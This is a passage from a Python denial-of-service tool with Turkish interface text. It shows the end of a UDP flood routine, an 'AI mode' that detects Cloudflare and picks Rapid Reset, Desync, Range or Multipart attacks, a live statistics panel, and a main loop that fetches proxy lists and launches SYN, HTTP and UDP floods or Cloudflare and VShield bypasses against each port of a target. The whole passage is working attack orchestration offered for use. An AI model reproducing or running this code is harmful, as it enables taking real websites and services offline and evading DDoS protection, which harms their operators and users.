    for t in threads_list: t.start()
    for t in threads_list: t.join(timeout=1)
    if stop_flag: return {"success": sent, "failed": 0, "rps": sent/duration}
    console.print(f"[green]✓ UDP Flood tamamlandı. Toplam: {sent}[/green]")
    return {"success": sent, "failed": 0, "rps": sent / duration}

def ai_mode(target, port, duration, threads):
    console.print("[yellow]⏳ AI Modu: Hedef analiz ediliyor...[/yellow]")
    try:
        resp = requests.get(f"http://{target}:{port}/", timeout=3, verify=False)
        if "cloudflare" in resp.headers.get("Server", "").lower():
            console.print("[green]✓ Cloudflare tespit! Rapid Reset + Desync kullanılacak.[/green]")
            rapid_reset_attack(target, port, duration, threads//2)
            desync_attack(target, port, duration, threads//2)
            return
        else:
            console.print("[green]✓ Cloudflare yok, Range + Multipart dene.[/green]")
            range_attack(target, port, duration, threads//2)
            multipart_attack(target, port, duration, threads//2)
            return
    except:
        console.print("[yellow]⏳ Hedefe erişilemedi, Rapid Reset dene.[/yellow]")
        rapid_reset_attack(target, port, duration, threads)
        return

# ------------------------------------------------------------
# CANLI İSTATİSTİK PANELİ
# ------------------------------------------------------------
def live_stats(duration):
    global global_stats
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TimeElapsedColumn(),
        TimeRemainingColumn(),
        console=console,
        refresh_per_second=10
    ) as progress:
        task = progress.add_task("[cyan]🌀 Saldırı devam ediyor...", total=duration)
        start = time.time()
        while not stop_flag and (time.time() - start) < duration:
            elapsed = int(time.time() - start)
            remaining = max(0, duration - elapsed)
            success = global_stats["success"]
            failed = global_stats["failed"]
            total = success + failed
            rps = success / max(1, elapsed)
            progress.update(
                task,
                description=f"[cyan]✅ Başarılı: {success}  ❌ Başarısız: {failed}  🚀 RPS: {rps:.2f}",
                completed=elapsed
            )
            time.sleep(0.1)
        progress.update(task, completed=duration)
        console.print("[green]✓ Saldırı tamamlandı![/green]")

# ------------------------------------------------------------
# ANA DÖNGÜ
# ------------------------------------------------------------
def main():
    global proxy_list, stop_flag, global_stats

    if args.update_proxies:
        proxy_list = download_proxies([p.strip() for p in args.proxy_sources.split(',')])
        if proxy_list:
            with open("proxies_auto.txt", "w") as f:
                for p in proxy_list:
                    f.write(f"{p}\n")
            console.print("[green]✓ Proxy'ler 'proxies_auto.txt' kaydedildi.[/green]")
        if not any([args.layer4, args.layer7, args.quality, args.udp, args.rapid_reset, args.desync, args.range, args.multipart, args.ai_mode, args.cf_uam, args.cfb, args.vshield]):
            sys.exit(0)
    elif args.proxy_list:
        proxy_list = load_proxy_list(args.proxy_list)
    else:
        if os.path.exists("proxies.txt"):
            proxy_list = load_proxy_list("proxies.txt")

    try:
        target_ip = socket.gethostbyname(args.target)
        console.print(f"[green]✓ {args.target} -> {target_ip}[/green]")
    except:
        target_ip = args.target

    attack_func = None
    attack_name = ""
    if args.cf_uam:
        attack_func = cf_uam_bypass
        attack_name = "CF-UAM Bypass"
    elif args.cfb:
        attack_func = cfb_bypass
        attack_name = "CFB (Cloudflare Bypass)"
    elif args.vshield:
        attack_func = vshield_bypass
        attack_name = "VShield Bypass"
    elif args.rapid_reset:
        attack_func = rapid_reset_attack
        attack_name = "Rapid Reset"
    elif args.desync:
        attack_func = desync_attack
        attack_name = "Desync"
    elif args.range:
        attack_func = range_attack
        attack_name = "Range"
    elif args.multipart:
        attack_func = multipart_attack
        attack_name = "Multipart"
    elif args.layer4:
        attack_func = syn_flood
        attack_name = "SYN Flood"
    elif args.layer7:
        attack_func = http_flood
        attack_name = "HTTP Flood"
    elif args.quality:
        attack_func = http_flood
        attack_name = "HTTP Flood (Quality)"
    elif args.udp:
        attack_func = udp_flood
        attack_name = "UDP Flood"
    elif args.ai_mode:
        ai_mode(args.target, args.port, args.duration, args.threads)
        return
    else:
        console.print("[red]✗ Hiçbir saldırı türü seçilmedi! --help ile yardım alın.[/red]")
        sys.exit(1)

    console.print(f"[cyan]📡 Hedef portlar: {len(target_ports)} adet port[/cyan]")
    if len(target_ports) <= 20:
        console.print(f"[cyan]   → {', '.join(map(str, target_ports))}[/cyan]")
    else:
        console.print(f"[cyan]   → {target_ports[0]} - {target_ports[-1]} arası (ilk 20: {', '.join(map(str, target_ports[:20]))}...)[/cyan]")

    results = {"target": args.target, "ip": target_ip, "ports": target_ports, "tests": []}

    for port in target_ports:
        if stop_flag:
            break
        console.print(f"\n[bold cyan]🌀 {attack_name} SALDIRISI BAŞLATILIYOR (Port: {port})...[/bold cyan]")
        
        stats_thread = threading.Thread(target=live_stats, args=(args.duration,))
        stats_thread.daemon = True
        stats_thread.start()
        
        test_result = attack_func(args.target, port, args.duration, args.threads)
        results["tests"].append({"port": port, "type": attack_name, **test_result})
        
        stop_flag = True
        time.sleep(0.5)
        stop_flag = False
        global_stats = {"success": 0, "failed": 0, "rps": 0, "start_time": time.time()}

    if args.report:
        with open(args.report, 'w') as f:
            json.dump(results, f, indent=2)
        console.print(f"[green]✓ Rapor '{args.report}' kaydedildi.[/green]")
    
    if stop_flag:
        console.print("[yellow]⏹️ Kullanıcı tarafından durduruldu.[/yellow]")

if __name__ == "__main__":
    main()
